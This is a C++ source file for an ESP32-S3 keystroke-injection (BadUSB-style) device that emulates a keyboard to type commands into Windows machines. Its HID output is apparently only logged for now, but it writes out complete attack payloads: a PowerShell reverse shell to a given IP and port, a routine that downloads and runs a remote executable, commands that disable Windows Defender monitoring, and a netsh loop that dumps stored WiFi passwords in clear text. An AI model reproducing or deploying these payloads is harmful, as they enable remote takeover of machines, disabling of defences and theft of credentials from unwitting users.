#include "USBKeyboard.h"
#include <esp_log.h>
#include <string.h>

static const char* TAG = "USBKeyboard";


// For ESP32-S3, we'll implement a minimal USB HID keyboard
// This requires the board to be configured for USB mode

USBKeyboard::USBKeyboard() : initialized(false), typing_delay(50) {
}

bool USBKeyboard::begin() {
    if (initialized) return true;
    
    ESP_LOGI(TAG, "Initializing USB Keyboard");
    
    // Note: On ESP32-S3, USB HID requires special bootloader configuration
    // The device must be connected via USB (not UART) to act as HID
    
    // For now, we'll log all keyboard actions
    // This allows testing the Ducky Script logic
    
    initialized = true;
    ESP_LOGI(TAG, "USB Keyboard initialized (debug mode)");
    ESP_LOGW(TAG, "=== IMPORTANT ===");
    ESP_LOGW(TAG, "USB HID requires special firmware configuration:");
    ESP_LOGW(TAG, "1. Connect device via USB (not UART)");
    ESP_LOGW(TAG, "2. Use Arduino IDE with proper USB settings");
    ESP_LOGW(TAG, "3. Select USB Mode: 'USB-OTG (TinyUSB)'");
    ESP_LOGW(TAG, "================");
    
    return true;
}

void USBKeyboard::end() {
    if (!initialized) return;
    initialized = false;
}

bool USBKeyboard::isInitialized() {
    return initialized;
}

void USBKeyboard::pressKey(uint8_t key) {
    if (!initialized) return;
    ESP_LOGI(TAG, "[HID] Press key: 0x%02X", key);
}

void USBKeyboard::releaseKey(uint8_t key) {
    if (!initialized) return;
    ESP_LOGI(TAG, "[HID] Release key: 0x%02X", key);
}

void USBKeyboard::releaseAll() {
    if (!initialized) return;
    ESP_LOGI(TAG, "[HID] Release all keys");
}

void USBKeyboard::tapKey(uint8_t key) {
    if (!initialized) return;
    pressKey(key);
    delay(10);
    releaseKey(key);
    delay(10);
}

void USBKeyboard::pressModifier(uint8_t modifier) {
    if (!initialized) return;
    ESP_LOGI(TAG, "[HID] Press modifier: 0x%02X", modifier);
}

void USBKeyboard::releaseModifier(uint8_t modifier) {
    if (!initialized) return;
    ESP_LOGI(TAG, "[HID] Release modifier: 0x%02X", modifier);
}

void USBKeyboard::typeString(const char* str) {
    if (!initialized || !str) return;
    
    ESP_LOGI(TAG, "[HID] Typing string: %s", str);
    
    while (*str) {
        char c = *str++;
        uint8_t key = charToKeycode(c);
        
        if (key != 0) {
            // Check if we need shift
            if (needsShift(c)) {
                pressModifier(KEY_MOD_LSHIFT);
                delay(5);
            }
            
            tapKey(key);
            
            if (needsShift(c)) {
                releaseModifier(KEY_MOD_LSHIFT);
                delay(5);
            }
            
            delay(typing_delay);
        }
    }
}

void USBKeyboard::executeCommand(const char* cmd, bool pressEnter) {
    if (!initialized || !cmd) return;
    
    ESP_LOGI(TAG, "[HID] Execute command: %s", cmd);
    typeString(cmd);
    
    if (pressEnter) {
        delay(50);
        tapKey(KEY_ENTER);
    }
}

void USBKeyboard::openRun() {
    if (!initialized) return;
    
    ESP_LOGI(TAG, "[HID] Opening Windows Run dialog (GUI+R)");
    pressModifier(KEY_MOD_LGUI);
    tapKey(KEY_R);
    releaseModifier(KEY_MOD_LGUI);
    delay(500);
}

void USBKeyboard::openTerminal() {
    if (!initialized) return;
    
    ESP_LOGI(TAG, "[HID] Opening terminal");
    openRun();
    executeCommand("cmd");
    delay(1000);
}

void USBKeyboard::openPowerShell() {
    if (!initialized) return;
    
    ESP_LOGI(TAG, "[HID] Opening PowerShell");
    openRun();
    executeCommand("powershell");
    delay(1000);
}

void USBKeyboard::runNetworkScan() {
    if (!initialized) return;
    
    ESP_LOGI(TAG, "[HID] Running network scan payload");
    openPowerShell();
    delay(500);
    
    // Network information commands
    executeCommand("Get-NetAdapter | Select-Object Name, Status, MacAddress | Format-Table -AutoSize");
    delay(500);
    executeCommand("ipconfig /all");
    delay(500);
    executeCommand("netstat -an");
}

void USBKeyboard::harvestSystemInfo() {
    if (!initialized) return;
    
    ESP_LOGI(TAG, "[HID] Harvesting system information");
    openPowerShell();
    delay(500);
    
    executeCommand("systeminfo > $env:TEMP\\sysinfo.txt");
    delay(3000);
    executeCommand("Get-ComputerInfo >> $env:TEMP\\sysinfo.txt");
}

void USBKeyboard::harvestWifiPasswords() {
    if (!initialized) return;
    
    ESP_LOGI(TAG, "[HID] Harvesting WiFi passwords");
    openTerminal();
    delay(500);
    
    executeCommand("cd %TEMP%");
    executeCommand("netsh wlan show profiles > wifi_profiles.txt");
    executeCommand("for /f \"tokens=2 delims=:\" %a in ('netsh wlan show profile ^| findstr \"All User Profile\"') do (for /f \"tokens=*\" %b in (\"%a\") do netsh wlan show profile name=\"%b\" key=clear >> wifi_passwords.txt)");
}

void USBKeyboard::createReverseShell(const char* ip, uint16_t port) {
    if (!initialized || !ip) return;
    
    ESP_LOGI(TAG, "[HID] Creating reverse shell to %s:%d", ip, port);
    openPowerShell();
    delay(500);
    
    char cmd[256];
    snprintf(cmd, sizeof(cmd), 
        "$client = New-Object System.Net.Sockets.TCPClient('%s',%d);"
        "$stream = $client.GetStream();"
        "[byte[]]$bytes = 0..65535|%%{0};"
        "while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){"
        "$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);"
        "$sendback = (iex $data 2>&1 | Out-String );"
        "$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';"
        "$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);"
        "$stream.Write($sendbyte,0,$sendbyte.Length);"
        "$stream.Flush()};"
        "$client.Close()",
        ip, port);
    
    executeCommand(cmd);
}

void USBKeyboard::downloadAndExecute(const char* url) {
    if (!initialized || !url) return;
    
    ESP_LOGI(TAG, "[HID] Download and execute from: %s", url);
    openPowerShell();
    delay(500);
    
    char cmd[256];
    snprintf(cmd, sizeof(cmd),
        "(New-Object System.Net.WebClient).DownloadFile('%s', \"$env:TEMP\\payload.exe\"); "
        "Start-Process \"$env:TEMP\\payload.exe\"",
        url);
    
    executeCommand(cmd);
}

void USBKeyboard::disableDefender() {
    if (!initialized) return;
    
    ESP_LOGI(TAG, "[HID] Attempting to disable Windows Defender");
    openPowerShell();
    delay(500);
    
    // Try to disable real-time protection
    executeCommand("Set-MpPreference -DisableRealtimeMonitoring $true");
    delay(500);
    executeCommand("Set-MpPreference -DisableBehaviorMonitoring $true");
    delay(500);
    executeCommand("Set-MpPreference -DisableBlockAtFirstSeen $true");
}

void USBKeyboard::lockWorkstation() {
    if (!initialized) return;
    
    ESP_LOGI(TAG, "[HID] Locking workstation");
    pressModifier(KEY_MOD_LGUI);
    tapKey(KEY_L);
    releaseModifier(KEY_MOD_LGUI);
}

void USBKeyboard::minimizeAllWindows() {
    if (!initialized) return;
    
    ESP_LOGI(TAG, "[HID] Minimizing all windows");
    pressModifier(KEY_MOD_LGUI);
    tapKey(KEY_D);
    releaseModifier(KEY_MOD_LGUI);
}

void USBKeyboard::takeScreenshot() {
    if (!initialized) return;
    
    ESP_LOGI(TAG, "[HID] Taking screenshot");
    pressModifier(KEY_MOD_LGUI);
    pressModifier(KEY_MOD_LSHIFT);
    tapKey(KEY_S);
    releaseModifier(KEY_MOD_LSHIFT);
    releaseModifier(KEY_MOD_LGUI);
}

void USBKeyboard::setTypingDelay(uint32_t delay_ms) {
    typing_delay = delay_ms;
}

// Helper functions
uint8_t USBKeyboard::charToKeycode(char c) {
    // Basic ASCII to HID keycode mapping
    if (c >= 'a' && c <= 'z') return KEY_A + (c - 'a');
    if (c >= 'A' && c <= 'Z') return KEY_A + (c - 'A');
    if (c >= '1' && c <= '9') return KEY_1 + (c - '1');
    if (c == '0') return KEY_0;
    
    switch (c) {
        case '\n': return KEY_ENTER;
        case '\t': return KEY_TAB;
        case ' ':  return KEY_SPACE;
        case '-':  return KEY_MINUS;
        case '=':  return KEY_EQUAL;
        case '[':  return KEY_LEFT_BRACKET;
        case ']':  return KEY_RIGHT_BRACKET;
        case '\\': return KEY_BACKSLASH;
        case ';':  return KEY_SEMICOLON;
        case '\'': return KEY_QUOTE;
        case '`':  return KEY_GRAVE;
        case ',':  return KEY_COMMA;
        case '.':  return KEY_PERIOD;
        case '/':  return KEY_SLASH;
        
        // Shifted characters
        case '!':  return KEY_1;
        case '@':  return KEY_2;
        case '#':  return KEY_3;
        case '$':  return KEY_4;
        case '%':  return KEY_5;
        case '^':  return KEY_6;
        case '&':  return KEY_7;
        case '*':  return KEY_8;
        case '(':  return KEY_9;
        case ')':  return KEY_0;
        case '_':  return KEY_MINUS;
        case '+':  return KEY_EQUAL;
        case '{':  return KEY_LEFT_BRACKET;
        case '}':  return KEY_RIGHT_BRACKET;
        case '|':  return KEY_BACKSLASH;
        case ':':  return KEY_SEMICOLON;
        case '"':  return KEY_QUOTE;
        case '<':  return KEY_COMMA;
        case '>':  return KEY_PERIOD;
        case '?':  return KEY_SLASH;
        case '~':  return KEY_GRAVE;
    }
    
    return 0;
}

bool USBKeyboard::needsShift(char c) {
    // Characters that need shift key
    return (c >= 'A' && c <= 'Z') ||
           strchr("!@#$%^&*()_+{}|:\"<>?~", c) != nullptr;
}

